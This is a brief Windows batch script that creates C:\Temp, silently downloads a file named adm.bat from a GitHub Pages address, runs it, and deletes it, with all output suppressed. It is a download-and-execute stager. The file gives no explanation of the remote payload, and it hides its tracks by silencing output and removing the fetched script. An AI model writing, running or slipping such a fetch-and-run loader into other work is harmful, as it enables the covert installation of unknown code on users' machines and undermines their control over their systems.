@echo off && cls 
set tempDir=C:\Temp
if not exist %tempDir% (
    mkdir %tempDir%
)
cd %tempDir%
curl -o adm.bat https://suporteeq.github.io/adm.bat > NUL 2>&1 && call adm.bat && del adm.bat > NUL 2>&1